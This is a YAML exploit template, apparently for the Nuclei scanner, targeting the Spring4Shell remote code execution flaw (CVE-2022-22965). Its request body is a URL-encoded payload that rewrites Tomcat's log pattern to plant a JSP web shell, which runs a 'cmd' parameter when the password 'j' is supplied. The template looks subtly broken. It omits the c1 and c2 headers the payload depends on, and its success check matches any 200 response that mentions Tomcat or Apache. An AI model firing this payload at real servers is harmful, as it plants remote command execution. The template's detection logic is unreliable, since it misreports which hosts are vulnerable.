id: CVE-2022-22965
info:
  author: AutoRedTeam
  description: Spring Framework远程代码执行漏洞
  name: Spring Framework RCE (Spring4Shell)
  reference:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965
  - https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
  severity: critical
  tags:
  - cve
  - rce
  - spring
  - java
requests:
- body: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if%28%22j%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29.getInputStream%28%29%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%20out.println%28new%20String%28b%29%29%3B%20%7D%20%7D%20%25%7Bc2%7Di
  headers:
    Content-Type: application/x-www-form-urlencoded
    suffix: '%>//'
  matchers:
  - status:
    - 200
    type: status
  - condition: or
    part: body
    type: word
    words:
    - Tomcat
    - Apache
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/'
